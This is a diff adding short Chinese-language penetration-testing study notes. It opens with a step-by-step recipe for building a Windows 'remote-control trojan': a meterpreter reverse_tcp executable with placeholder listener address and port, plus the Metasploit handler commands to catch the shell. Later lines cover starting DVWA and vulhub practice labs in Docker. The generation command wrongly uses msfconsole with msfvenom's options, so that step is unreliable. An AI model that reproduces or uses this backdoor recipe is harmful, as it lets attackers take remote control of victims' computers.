@@ -1,0 +1,38 @@
+生成远控木马
+第一步： 生成后门木马
+ msfconsole -p windows/x64/meterpreter/reverse_tcp lhost=监听ip地址 lport=监听端口 -f exe -o 后接名称；
+第二步：使用漏洞
+  use exploit/multi/handler
+
+第三步：设置payload 
+ set payload windows/x64/meterpreter/reverse_tcp（与第一步保持一致）
+
+第四步：设置监听地址 （与第一步保持一致）
+
+第五步 设置监听端口（与第一步保持一致）
+
+第六步：run
+
+
+
+
+dvwaa搭建的网站
+docker run --rm -it -p 80:80 vulnerables/web-dvwa
+
+kali kali桌面进入vulhub-master 查看框架
+再用cd 加某一框架就可进入。
+
+
+开启靶场：docker-compose up -d
+关闭靶场：docker-compose down
+
+
+
+
+rce漏洞：
+
+
+
+
+
+
